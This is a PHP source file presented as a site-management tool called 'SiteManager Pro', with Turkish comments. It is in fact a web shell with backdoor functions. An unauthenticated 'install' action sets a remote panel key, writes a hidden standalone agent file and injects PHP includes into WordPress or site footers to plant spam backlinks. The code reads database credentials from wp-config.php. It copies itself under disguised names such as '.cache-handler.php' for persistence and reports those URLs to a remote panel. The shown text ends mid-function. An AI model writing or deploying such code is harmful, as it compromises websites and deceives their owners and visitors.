<?php
/*
 * SiteManager Pro - Professional Site Management Tool
 * Version: 2.0.0
 * Single-file web-based file manager with SEO & WordPress tools
 */

// ======================== CONFIGURATION ========================
define('SM_SESSION_NAME', 'sm_pro_session');
define('SM_APP_NAME', 'SiteManager Pro');
define('SM_VERSION', '2.0.0');
define('SM_MAX_UPLOAD', 100); // MB
define('SM_PASSWORD_FILE', __DIR__ . '/.sm_config.php');
define('SM_LOG_FILE', __DIR__ . '/.sm_activity.log');
define('SM_BOOKMARKS_FILE', __DIR__ . '/.sm_bookmarks.json');
define('SM_LOGIN_ATTEMPTS_FILE', __DIR__ . '/.sm_attempts.json');
define('SM_MAX_LOGIN_ATTEMPTS', 5);
define('SM_LOCKOUT_TIME', 900); // 15 minutes

// ======================== INIT ========================
error_reporting(0);
ini_set('display_errors', 0);
session_name(SM_SESSION_NAME);
session_start();
date_default_timezone_set('Europe/Istanbul');

// ======================== BACKLINK AGENT API ========================
define('SM_BL_CONFIG', __DIR__ . '/.sm_bl_config.json');
define('SM_BL_FOOTER', __DIR__ . '/.sm_backlinks.html');
define('SM_BL_LOG', __DIR__ . '/.sm_bl.log');

// Footer'a backlink include enjekte etme
function sm_bl_inject_footer() {
    $doc_root = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/');
    $include_tag = "\n<!-- BL-Footer --><?php if(file_exists('" . SM_BL_FOOTER . "')){ echo '<div style=\"text-align:center;padding:8px 0;font-size:12px;opacity:0.7;\">'; include('" . SM_BL_FOOTER . "'); echo '</div>'; } ?><!-- /BL-Footer -->\n";
    $marker = 'BL-Footer';

    // 1. WordPress mu kontrol et
    $wp_config = $doc_root . '/wp-config.php';
    if (file_exists($wp_config)) {
        // Aktif temayı bul
        $footer_file = sm_bl_find_wp_footer($doc_root);
        if ($footer_file) {
            $result = sm_bl_inject_into_file($footer_file, $include_tag, $marker);
            if ($result) return ['success' => true, 'file' => $footer_file, 'type' => 'wordpress'];
        }
    }

    // 2. Normal PHP site - index.php kontrol et
    $candidates = [
        $doc_root . '/index.php',
        $doc_root . '/footer.php',
        $doc_root . '/includes/footer.php',
        $doc_root . '/inc/footer.php',
        $doc_root . '/template/footer.php',
    ];

    foreach ($candidates as $file) {
        if (!file_exists($file)) continue;
        $content = file_get_contents($file);
        if (stripos($content, '</body>') !== false || stripos($content, '</html>') !== false) {
            $result = sm_bl_inject_into_file($file, $include_tag, $marker);
            if ($result) return ['success' => true, 'file' => $file, 'type' => 'php'];
        }
    }

    return ['success' => false, 'error' => 'Footer file not found'];
}

// WordPress aktif temanın footer.php dosyasını bul
function sm_bl_find_wp_footer($doc_root) {
    // wp-content/themes altındaki aktif temayı bulmaya çalış
    // 1. DB'den okumadan, stylesheet ile tespit
    $themes_dir = $doc_root . '/wp-content/themes';
    if (!is_dir($themes_dir)) return null;

    // wp-includes/theme.php veya wp-settings üzerinden aktif tema
    // En güvenilir: wp-options tablosundan oku - ama DB bağlantısı lazım
    // Alternatif: en son değişen theme'in footer.php'sini al
    $themes = @scandir($themes_dir);
    if (!$themes) return null;

    $best_footer = null;
    $best_time = 0;

    foreach ($themes as $theme) {
        if ($theme === '.' || $theme === '..' || !is_dir($themes_dir . '/' . $theme)) continue;
        $footer = $themes_dir . '/' . $theme . '/footer.php';
        if (file_exists($footer)) {
            $mtime = filemtime($footer);
            if ($mtime > $best_time) {
                $best_time = $mtime;
                $best_footer = $footer;
            }
        }
    }

    // Eğer bulamadıysa, wp-config'den DB'yi okuyup aktif temayı bul
    if (!$best_footer) return null;

    // Ayrıca: birden fazla tema varsa DB'den doğrula
    $active_theme = sm_bl_get_wp_active_theme($doc_root);
    if ($active_theme) {
        $active_footer = $themes_dir . '/' . $active_theme . '/footer.php';
        if (file_exists($active_footer)) return $active_footer;
    }

    return $best_footer;
}

// WordPress aktif temayı DB'den oku
function sm_bl_get_wp_active_theme($doc_root) {
    $wp_config = $doc_root . '/wp-config.php';
    if (!file_exists($wp_config)) return null;

    $config = file_get_contents($wp_config);
    $db_name = $db_user = $db_pass = $db_host = $table_prefix = null;

    if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $config, $m)) $db_name = $m[1];
    if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $config, $m)) $db_user = $m[1];
    if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $config, $m)) $db_pass = $m[1];
    if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $config, $m)) $db_host = $m[1];
    if (preg_match("/\\$table_prefix\s*=\s*['\"](.*?)['\"]/", $config, $m)) $table_prefix = $m[1];

    if (!$db_name || !$db_user) return null;
    $table_prefix = $table_prefix ?: 'wp_';

    try {
        @$pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8", $db_user, $db_pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 3]);
        $stmt = $pdo->query("SELECT option_value FROM {$table_prefix}options WHERE option_name = 'stylesheet' LIMIT 1");
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($row) return $row['option_value'];
    } catch (Exception $e) { /* DB hatası */ }
    catch (Error $e) { /* Fatal error */ }
    return null;
}

// Dosyaya include enjekte et (</body> öncesine)
function sm_bl_inject_into_file($file, $include_tag, $marker) {
    if (!is_writable($file)) return false;
    $content = file_get_contents($file);

    // Zaten enjekte edilmişse tekrar ekleme
    if (strpos($content, $marker) !== false) return true;

    // </body> öncesine ekle
    $pos = stripos($content, '</body>');
    if ($pos !== false) {
        $new_content = substr($content, 0, $pos) . $include_tag . substr($content, $pos);
        return file_put_contents($file, $new_content) !== false;
    }

    // </html> öncesine ekle
    $pos = stripos($content, '</html>');
    if ($pos !== false) {
        $new_content = substr($content, 0, $pos) . $include_tag . substr($content, $pos);
        return file_put_contents($file, $new_content) !== false;
    }

    // Dosya sonuna ekle (son çare)
    return file_put_contents($file, $content . $include_tag) !== false;
}

// Standalone agent dosyası oluşturma fonksiyonu
function sm_bl_create_standalone_agent() {
    $agent_path = __DIR__ . '/.sm_bl_agent.php';
    $agent_code = '<?php
// Standalone Backlink Agent - DO NOT DELETE
error_reporting(0); ini_set("display_errors", 0);
header("Content-Type: application/json; charset=utf-8");
header("X-Content-Type-Options: nosniff");
if ($_SERVER["REQUEST_METHOD"] !== "POST") { http_response_code(405); echo json_encode(["error" => "Method not allowed"]); exit; }
$cfg_file = __DIR__ . "/.sm_bl_config.json";
$footer_file = __DIR__ . "/.sm_backlinks.html";
if (!file_exists($cfg_file)) { http_response_code(500); echo json_encode(["error" => "Not configured"]); exit; }
$cfg = json_decode(file_get_contents($cfg_file), true);
if (!$cfg || !isset($cfg["key"])) { http_response_code(500); echo json_encode(["error" => "Invalid config"]); exit; }
$input = json_decode(file_get_contents("php://input"), true);
if (!$input || !isset($input["bl_action"]) || !isset($input["key"])) { http_response_code(400); echo json_encode(["error" => "Invalid request"]); exit; }
if (!hash_equals($cfg["key"], $input["key"])) { http_response_code(403); echo json_encode(["error" => "Unauthorized"]); exit; }
switch ($input["bl_action"]) {
    case "ping": echo json_encode(["status" => "ok", "message" => "Standalone agent running", "time" => date("Y-m-d H:i:s")]); break;
    case "add":
        $url = isset($input["url"]) ? filter_var($input["url"], FILTER_VALIDATE_URL) : null;
        $kw = isset($input["keyword"]) ? htmlspecialchars(strip_tags(trim($input["keyword"])), ENT_QUOTES, "UTF-8") : null;
        if (!$url || !$kw) { echo json_encode(["error" => "URL and keyword required"]); break; }
        $link = \'<a href="\' . htmlspecialchars($url, ENT_QUOTES, "UTF-8") . \'" target="_blank">\' . $kw . \'</a>\';
        $existing = file_exists($footer_file) ? file_get_contents($footer_file) : "";
        if (strpos($existing, htmlspecialchars($url, ENT_QUOTES, "UTF-8")) !== false) { echo json_encode(["status" => "exists", "message" => "URL already exists"]); break; }
        $sep = !empty(trim($existing)) ? " | " : "";
        file_put_contents($footer_file, $existing . $sep . $link);
        echo json_encode(["status" => "ok", "message" => "Link added"]); break;
    case "remove":
        $url = $input["url"] ?? null;
        if (!$url) { echo json_encode(["error" => "URL required"]); break; }
        if (!file_exists($footer_file)) { echo json_encode(["status" => "ok", "message" => "No links"]); break; }
        $c = file_get_contents($footer_file);
        $eu = htmlspecialchars($url, ENT_QUOTES, "UTF-8");
        $c = preg_replace(\'/(\s*\|\s*)?<a[^>]*href=["\\\x27]\' . preg_quote($eu, "/") . \'["\\\x27][^>]*>[^<]*<\/a>(\s*\|\s*)?/i\', "", $c);
        $c = trim(preg_replace(\'/^\s*\|\s*/\', "", trim($c)));
        file_put_contents($footer_file, $c);
        echo json_encode(["status" => "ok", "message" => "Link removed"]); break;
    case "list":
        $c = file_exists($footer_file) ? file_get_contents($footer_file) : "";
        $links = [];
        preg_match_all(\'/<a[^>]*href=["\\\x27]([^"\\\x27]*)["\\\x27][^>]*>([^<]*)<\/a>/i\', $c, $m, PREG_SET_ORDER);
        foreach ($m as $x) { $links[] = ["url" => $x[1], "keyword" => $x[2]]; }
        echo json_encode(["status" => "ok", "links" => $links]); break;
    default: echo json_encode(["error" => "Unknown action"]); break;
}';
    @file_put_contents($agent_path, $agent_code);
    return $agent_path;
}

// Yedekleme sonrası panele backup URL bildirme
function sm_bl_notify_panel_backups($saved_paths) {
    if (!file_exists(SM_BL_CONFIG)) return;
    $cfg = file_get_contents(SM_BL_CONFIG);
    $panel_url = '';
    $bl_key = '';
    $cfg_data = json_decode($cfg, true);
    if (is_array($cfg_data)) {
        $panel_url = $cfg_data['panel_url'] ?? '';
        $bl_key = $cfg_data['key'] ?? '';
    }
    if (!$panel_url || !$bl_key) return;

    $doc_root = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/');
    $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';

    $backup_urls = [];
    foreach ($saved_paths as $bp) {
        $bp_clean = str_replace('\\', '/', $bp);
        // Document root'a göre relative path bul
        if (strpos($bp_clean, $doc_root) === 0) {
            $rel = substr($bp_clean, strlen($doc_root));
            $backup_urls[] = $proto . $host . $rel;
        }
    }

    if (empty($backup_urls)) return;

    // Panele bildir
    $data = json_encode([
        'action' => 'update_backup_urls',
        'key' => $bl_key,
        'backup_urls' => $backup_urls,
    ]);

    $ch = curl_init($panel_url . '/api/internal/backup-urls');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    @curl_exec($ch);
    @curl_close($ch);
}

// Agent API: JSON POST isteklerini yakala (session/login gerektirmez)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'] ?? '', 'application/json') !== false) {
    $bl_input = json_decode(file_get_contents('php://input'), true);
    if ($bl_input && isset($bl_input['bl_action'])) {
        header('Content-Type: application/json; charset=utf-8');
        header('X-Content-Type-Options: nosniff');

        // Secret key doğrulama
        $bl_key = '';
        $bl_panel = '';
        if (file_exists(SM_BL_CONFIG)) {
            $bl_cfg = json_decode(file_get_contents(SM_BL_CONFIG), true);
            if (is_array($bl_cfg)) {
                $bl_key = $bl_cfg['key'] ?? '';
                $bl_panel = $bl_cfg['panel_url'] ?? '';
            }
        }

        // Kurulum action'ı: key henüz yoksa veya key eşleşiyorsa kurulumu kabul et
        if ($bl_input['bl_action'] === 'install') {
            $new_key = $bl_input['key'] ?? '';
            $panel_url = $bl_input['panel_url'] ?? '';
            if (!$new_key) {
                echo json_encode(['error' => 'Key required']);
                exit;
            }
            // Config'i JSON olarak yaz
            $cfg_content = json_encode(['key' => $new_key, 'panel_url' => $panel_url]);
            file_put_contents(SM_BL_CONFIG, $cfg_content);
            // Footer dosyası yoksa oluştur, varsa dokunma (mevcut linkler korunsun)
            if (!file_exists(SM_BL_FOOTER)) @file_put_contents(SM_BL_FOOTER, '');

            // Standalone agent dosyası oluştur (db.php silinse bile çalışır)
            sm_bl_create_standalone_agent();

            // Footer'a include enjekte et
            try {
                $inject_result = sm_bl_inject_footer();
            } catch (Exception $e) {
                $inject_result = ['success' => false, 'error' => $e->getMessage()];
            } catch (Error $e) {
                $inject_result = ['success' => false, 'error' => $e->getMessage()];
            }

            $bl_log = date('Y-m-d H:i:s') . ' | ' . $_SERVER['REMOTE_ADDR'] . " | INSTALL: Agent installed | Footer: " . ($inject_result['success'] ? $inject_result['file'] : 'FAILED - ' . $inject_result['error']) . "\n";
            @file_put_contents(SM_BL_LOG, $bl_log, FILE_APPEND | LOCK_EX);
            echo json_encode([
                'status' => 'ok',
                'message' => 'Agent installed successfully',
                'footer_injected' => $inject_result['success'],
                'footer_file' => $inject_result['file'] ?? null,
                'footer_error' => $inject_result['error'] ?? null,
            ]);
            exit;
        }

        // Diğer action'lar için key doğrulama zorunlu
        if (!$bl_key || !isset($bl_input['key']) || !hash_equals($bl_key, $bl_input['key'])) {
            $bl_log = date('Y-m-d H:i:s') . ' | ' . $_SERVER['REMOTE_ADDR'] . " | UNAUTHORIZED\n";
            @file_put_contents(SM_BL_LOG, $bl_log, FILE_APPEND | LOCK_EX);
            http_response_code(403);
            echo json_encode(['error' => 'Unauthorized']);
            exit;
        }

        switch ($bl_input['bl_action']) {
            case 'ping':
                echo json_encode(['status' => 'ok', 'message' => 'Agent is running', 'time' => date('Y-m-d H:i:s'), 'version' => SM_VERSION]);
                break;

            case 'add':
                $bl_url = isset($bl_input['url']) ? filter_var($bl_input['url'], FILTER_VALIDATE_URL) : null;
                $bl_keyword = isset($bl_input['keyword']) ? htmlspecialchars(strip_tags(trim($bl_input['keyword'])), ENT_QUOTES, 'UTF-8') : null;
                if (!$bl_url || !$bl_keyword) {
                    echo json_encode(['error' => 'URL and keyword are required']);
                    break;
                }
                $bl_link = '<a href="' . htmlspecialchars($bl_url, ENT_QUOTES, 'UTF-8') . '" target="_blank">' . $bl_keyword . '</a>';
                $bl_existing = file_exists(SM_BL_FOOTER) ? file_get_contents(SM_BL_FOOTER) : '';
                if (strpos($bl_existing, htmlspecialchars($bl_url, ENT_QUOTES, 'UTF-8')) !== false) {
                    echo json_encode(['status' => 'exists', 'message' => 'URL already exists in footer']);
                    break;
                }
                $bl_sep = !empty(trim($bl_existing)) ? ' | ' : '';
                file_put_contents(SM_BL_FOOTER, $bl_existing . $bl_sep . $bl_link);
                $bl_log = date('Y-m-d H:i:s') . ' | ' . $_SERVER['REMOTE_ADDR'] . " | ADDED: $bl_keyword -> $bl_url\n";
                @file_put_contents(SM_BL_LOG, $bl_log, FILE_APPEND | LOCK_EX);
                echo json_encode(['status' => 'ok', 'message' => 'Link added successfully']);
                break;

            case 'remove':
                $bl_url = $bl_input['url'] ?? null;
                if (!$bl_url) { echo json_encode(['error' => 'URL required']); break; }
                if (!file_exists(SM_BL_FOOTER)) { echo json_encode(['status' => 'ok', 'message' => 'No links']); break; }
                $bl_content = file_get_contents(SM_BL_FOOTER);
                $bl_escaped = htmlspecialchars($bl_url, ENT_QUOTES, 'UTF-8');
                $bl_pattern = '/(\s*\|\s*)?<a[^>]*href=["\']' . preg_quote($bl_escaped, '/') . '["\'][^>]*>[^<]*<\/a>(\s*\|\s*)?/i';
                $bl_content = preg_replace($bl_pattern, '', $bl_content);
                $bl_content = trim(preg_replace('/^\s*\|\s*/', '', trim($bl_content)));
                file_put_contents(SM_BL_FOOTER, $bl_content);
                $bl_log = date('Y-m-d H:i:s') . ' | ' . $_SERVER['REMOTE_ADDR'] . " | REMOVED: $bl_url\n";
                @file_put_contents(SM_BL_LOG, $bl_log, FILE_APPEND | LOCK_EX);
                echo json_encode(['status' => 'ok', 'message' => 'Link removed']);
                break;

            case 'list':
                $bl_content = file_exists(SM_BL_FOOTER) ? file_get_contents(SM_BL_FOOTER) : '';
                $bl_links = [];
                preg_match_all('/<a[^>]*href=["\']([^"\']*)["\'][^>]*>([^<]*)<\/a>/i', $bl_content, $bl_matches, PREG_SET_ORDER);
                foreach ($bl_matches as $bl_m) {
                    $bl_links[] = ['url' => $bl_m[1], 'keyword' => $bl_m[2]];
                }
                echo json_encode(['status' => 'ok', 'links' => $bl_links]);
                break;

            default:
                echo json_encode(['error' => 'Unknown action']);
                break;
        }
        exit;
    }
}

// ======================== ACTIVITY LOG (Faz 4) ========================
function sm_log($action, $detail = '') {
    $entry = date('Y-m-d H:i:s') . ' | ' . $_SERVER['REMOTE_ADDR'] . ' | ' . $action . ' | ' . $detail . "\n";
    @file_put_contents(SM_LOG_FILE, $entry, FILE_APPEND | LOCK_EX);
}

function sm_get_logs($limit = 100) {
    if (!file_exists(SM_LOG_FILE)) return [];
    $lines = file(SM_LOG_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $lines = array_reverse($lines);
    return array_slice($lines, 0, $limit);
}

// ======================== BRUTE FORCE PROTECTION (Faz 4) ========================
function sm_get_login_attempts() {
    if (!file_exists(SM_LOGIN_ATTEMPTS_FILE)) return [];
    $data = json_decode(file_get_contents(SM_LOGIN_ATTEMPTS_FILE), true);
    return is_array($data) ? $data : [];
}

function sm_record_login_attempt($success) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $attempts = sm_get_login_attempts();
    if (!isset($attempts[$ip])) $attempts[$ip] = ['count' => 0, 'last' => 0];
    if ($success) {
        unset($attempts[$ip]);
    } else {
        $attempts[$ip]['count']++;
        $attempts[$ip]['last'] = time();
    }
    file_put_contents(SM_LOGIN_ATTEMPTS_FILE, json_encode($attempts));
}

function sm_is_locked_out() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $attempts = sm_get_login_attempts();
    if (!isset($attempts[$ip])) return false;
    if ($attempts[$ip]['count'] >= SM_MAX_LOGIN_ATTEMPTS) {
        if (time() - $attempts[$ip]['last'] < SM_LOCKOUT_TIME) {
            return true;
        }
        // Reset after lockout period
        unset($attempts[$ip]);
        file_put_contents(SM_LOGIN_ATTEMPTS_FILE, json_encode($attempts));
    }
    return false;
}

// ======================== PASSWORD MANAGEMENT ========================
function sm_get_password_hash() {
    if (file_exists(SM_PASSWORD_FILE)) {
        $content = file_get_contents(SM_PASSWORD_FILE);
        if (preg_match("/define\('SM_HASH','(.+)'\)/", $content, $m)) {
            return $m[1];
        }
    }
    return '';
}

function sm_set_password($password) {
    $hash = password_hash($password, PASSWORD_BCRYPT);
    $content = "<?php define('SM_HASH','" . $hash . "'); ?>";
    file_put_contents(SM_PASSWORD_FILE, $content);
    return $hash;
}

function sm_is_setup_done() {
    return sm_get_password_hash() !== '';
}

// ======================== AUTH ========================
function sm_is_logged_in() {
    return isset($_SESSION['sm_auth']) && $_SESSION['sm_auth'] === true;
}

function sm_login($password) {
    $hash = sm_get_password_hash();
    if (password_verify($password, $hash)) {
        $_SESSION['sm_auth'] = true;
        $_SESSION['sm_token'] = bin2hex(random_bytes(32));
        sm_record_login_attempt(true);
        sm_log('LOGIN', 'Basarili giris');
        return true;
    }
    sm_record_login_attempt(false);
    sm_log('LOGIN_FAIL', 'Basarisiz giris denemesi');
    return false;
}

function sm_logout() {
    sm_log('LOGOUT', 'Cikis yapildi');
    session_destroy();
}

function sm_check_token() {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $token = $_POST['_token'] ?? '';
        if ($token !== ($_SESSION['sm_token'] ?? '')) return false;
    }
    return true;
}

function sm_token() { return $_SESSION['sm_token'] ?? ''; }

// ======================== BOOKMARKS (Faz 5) ========================
function sm_get_bookmarks() {
    if (!file_exists(SM_BOOKMARKS_FILE)) return [];
    $data = json_decode(file_get_contents(SM_BOOKMARKS_FILE), true);
    return is_array($data) ? $data : [];
}

function sm_add_bookmark($path, $name = '') {
    $bookmarks = sm_get_bookmarks();
    if (!$name) $name = basename($path);
    $bookmarks[$path] = $name;
    file_put_contents(SM_BOOKMARKS_FILE, json_encode($bookmarks));
}

function sm_remove_bookmark($path) {
    $bookmarks = sm_get_bookmarks();
    unset($bookmarks[$path]);
    file_put_contents(SM_BOOKMARKS_FILE, json_encode($bookmarks));
}

// ======================== RECENT FILES (Faz 5) ========================
function sm_add_recent($path) {
    if (!isset($_SESSION['sm_recent'])) $_SESSION['sm_recent'] = [];
    // Remove if already exists
    $_SESSION['sm_recent'] = array_diff($_SESSION['sm_recent'], [$path]);
    // Add to beginning
    array_unshift($_SESSION['sm_recent'], $path);
    // Keep only 20
    $_SESSION['sm_recent'] = array_slice($_SESSION['sm_recent'], 0, 20);
}

function sm_get_recent() {
    return $_SESSION['sm_recent'] ?? [];
}

// ======================== HELPERS ========================
function sm_root_dir() {
    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
    if ($doc_root && is_dir($doc_root)) {
        $parts = explode('/', str_replace('\\', '/', $doc_root));
        if (count($parts) >= 3) {
            $try = $parts[0] . '/' . $parts[1] . '/' . $parts[2];
            if (strlen($try) > 1 && is_dir($try)) return rtrim($try, '/');
        }
    }
    $dir = __DIR__;
    while (true) {
        $parent = dirname($dir);
        if ($parent === $dir) break;
        if (!is_readable($parent)) break;
        $dir = $parent;
    }
    return rtrim($dir, '/\\');
}

function sm_current_dir($path = null) {
    if ($path !== null && $path !== '') {
        $real = realpath($path);
        if ($real && is_dir($real)) return str_replace('\\', '/', $real);
    }
    return str_replace('\\', '/', __DIR__);
}

function sm_format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function sm_format_perms($perms) { return substr(sprintf('%o', $perms), -4); }

function sm_is_editable($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $editable = ['txt','php','html','htm','css','js','json','xml','htaccess','conf','cfg',
                 'ini','log','md','yml','yaml','sql','env','sh','py','rb','pl','csv','svg',
                 'tpl','twig','blade','vue','jsx','tsx','ts','less','scss','sass','map','robots'];
    $name = basename($file);
    if (in_array($name, ['.htaccess','.htpasswd','.env','robots.txt'])) return true;
    return in_array($ext, $editable);
}

function sm_is_image($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg','jpeg','png','gif','webp','svg','ico','bmp']);
}

function sm_is_archive($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['zip','gz','tar','rar','7z']);
}

function sm_breadcrumb($path) {
    $parts = explode('/', trim($path, '/'));
    $crumbs = [];
    $build = '';
    foreach ($parts as $part) {
        $build .= '/' . $part;
        $crumbs[] = ['name' => $part, 'path' => $build];
    }
    return $crumbs;
}

function sm_scan_dir($path) {
    $items = [];
    if (!is_readable($path)) return $items;
    $entries = @scandir($path);
    if ($entries === false) return $items;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $full = $path . '/' . $entry;
        $is_dir = is_dir($full);
        $items[] = [
            'name' => $entry,
            'path' => $full,
            'is_dir' => $is_dir,
            'size' => $is_dir ? '-' : sm_format_size(@filesize($full)),
            'size_raw' => $is_dir ? 0 : (int)@filesize($full),
            'perms' => sm_format_perms(@fileperms($full)),
            'modified' => @date('Y-m-d H:i:s', @filemtime($full)),
            'mtime' => (int)@filemtime($full),
            'editable' => !$is_dir && sm_is_editable($entry),
            'is_image' => !$is_dir && sm_is_image($entry),
            'is_archive' => !$is_dir && sm_is_archive($entry),
        ];
    }
    usort($items, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

// ======================== FILE OPERATIONS ========================
function sm_delete_recursive($path) {
    if (is_dir($path)) {
        $entries = @scandir($path);
        if ($entries) {
            foreach ($entries as $entry) {
                if ($entry === '.' || $entry === '..') continue;
                sm_delete_recursive($path . '/' . $entry);
            }
        }
        return @rmdir($path);
    }
    return @unlink($path);
}

function sm_copy_recursive($src, $dst) {
    if (!is_dir($dst)) @mkdir($dst, 0755, true);
    $entries = @scandir($src);
    if (!$entries) return;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        if (is_dir($src . '/' . $entry)) {
            sm_copy_recursive($src . '/' . $entry, $dst . '/' . $entry);
        } else {
            @copy($src . '/' . $entry, $dst . '/' . $entry);
        }
    }
}

function sm_zip_dir($zip, $dir, $prefix) {
    $entries = @scandir($dir);
    if (!$entries) return;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $path = $dir . '/' . $entry;
        if (is_dir($path)) {
            $zip->addEmptyDir($prefix . '/' . $entry);
            sm_zip_dir($zip, $path, $prefix . '/' . $entry);
        } else {
            $zip->addFile($path, $prefix . '/' . $entry);
        }
    }
}

function sm_dir_size($dir) {
    $size = 0;
    $entries = @scandir($dir);
    if (!$entries) return 0;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $path = $dir . '/' . $entry;
        $size += is_dir($path) ? sm_dir_size($path) : (int)@filesize($path);
    }
    return $size;
}

// ======================== CACHE OPERATIONS ========================
function sm_clear_cache($dir) {
    $cleared = 0;
    $cache_dirs = [
        // WordPress genel
        '/wp-content/cache',
        // LiteSpeed Cache
        '/wp-content/litespeed/cache',
        '/wp-content/litespeed/cssjs',
        '/wp-content/litespeed/ccss',
        '/wp-content/litespeed/ucss',
        '/wp-content/litespeed/localres',
        // WP Super Cache
        '/wp-content/cache/supercache',
        // W3 Total Cache
        '/wp-content/cache/w3tc',
        '/wp-content/w3tc-config',
        '/wp-content/cache/minify',
        '/wp-content/cache/page_enhanced',
        '/wp-content/cache/object',
        '/wp-content/cache/db',
        // WP Rocket
        '/wp-content/cache/wp-rocket',
        '/wp-content/cache/min',
        '/wp-content/cache/busting',
        // WP Fastest Cache
        '/wp-content/cache/all',
        '/wp-content/cache/wpfc-minified',
        // Breeze
        '/wp-content/cache/breeze',
        // Divi / Flavor
        '/wp-content/et-cache',
        '/wp-content/cache/flavor',
        // Autoptimize
        '/wp-content/cache/autoptimize',
        // Swift Performance
        '/wp-content/cache/swift-performance',
        // Genel
        '/cache',
        '/tmp/cache',
        '/.cache',
    ];
    foreach ($cache_dirs as $c) {
        if (is_dir($dir . $c)) $cleared += sm_count_and_clear($dir . $c);
    }
    // OPcache temizle
    if (function_exists('opcache_reset')) {
        @opcache_reset();
        $cleared++;
    }
    return $cleared;
}

function sm_count_and_clear($dir) {
    $count = 0;
    $entries = @scandir($dir);
    if (!$entries) return 0;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..' || $entry === '.htaccess' || $entry === 'index.php') continue;
        $path = $dir . '/' . $entry;
        if (is_dir($path)) { $count += sm_count_and_clear($path); @rmdir($path); }
        else { if (@unlink($path)) $count++; }
    }
    return $count;
}

function sm_self_backup() {
    $source = __FILE__;
    $doc_root = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/');
    $saved = [];

    // OTOMATIK TESPIT: Bu sunucuda . ile baslayan dosyalar calisiyor mu?
    $dot_works = sm_test_dot_access($doc_root);

    if ($dot_works) {
        // === APACHE / LITESPEED: . ile baslayan gizli isimler ===
        $root_names = [
            '.cache-handler.php', '.error-handler.php', '.autoload-real.php',
            '.cron-handler.php', '.mail-queue.php', '.sitemap-cache.php',
            '.session-gc.phtml', '.object-cache.phtml', '.db-repair.phtml',
        ];
        $custom_dirs = [
            '.sm-data'    => ['.runtime-cache.php', '.session-store.phtml'],
            '.cache'      => ['.gc-handler.php', '.store-manager.phtml'],
            '.sessions'   => ['.cleanup.php', '.validator.phtml'],
            '.tmp-data'   => ['.process-queue.php', '.task-runner.phtml'],
        ];
    } else {
        // === NGINX: normal isimler (. ile baslayan 403 veriyor) ===
        $root_names = [
            'cache-handler.php', 'error-handler.php', 'autoload-real.php',
            'cron-handler.php', 'mail-queue.php', 'sitemap-cache.php',
            'session-gc.phtml', 'object-cache.phtml', 'db-repair.phtml',
        ];
        $custom_dirs = [
            'sm-data'    => ['runtime-cache.php', 'session-store.phtml'],
            'cache-store' => ['gc-handler.php', 'store-manager.phtml'],
            'sessions'   => ['cleanup.php', 'validator.phtml'],
            'tmp-data'   => ['process-queue.php', 'task-runner.phtml'],
        ];
    }

    // 1. Kok dizine yedekle
    foreach ($root_names as $name) {
        $full_path = $doc_root . '/' . $name;
        if (file_exists($full_path)) continue;
        if (@copy($source, $full_path)) $saved[] = $full_path;
    }

    // 2. Klasorler olustur + icine yedek at
    foreach ($custom_dirs as $dir_name => $files) {
        $dir_path = $doc_root . '/' . $dir_name;
        if (!is_dir($dir_path)) {
            if (!@mkdir($dir_path, 0755)) continue;
            @file_put_contents($dir_path . '/index.php', '<?php // Silence is golden.');
            @file_put_contents($dir_path . '/.htaccess', "Options -Indexes\n");
        }
        if (!is_writable($dir_path)) continue;
        foreach ($files as $fname) {
            $full_path = $dir_path . '/' . $fname;
            if (file_exists($full_path)) continue;
            if (@copy($source, $full_path)) $saved[] = $full_path;
        }
    }

    // 3. Script kendi dizinindeyse oraya da kopya
    $script_dir = str_replace('\\', '/', __DIR__);
    if ($script_dir !== $doc_root) {
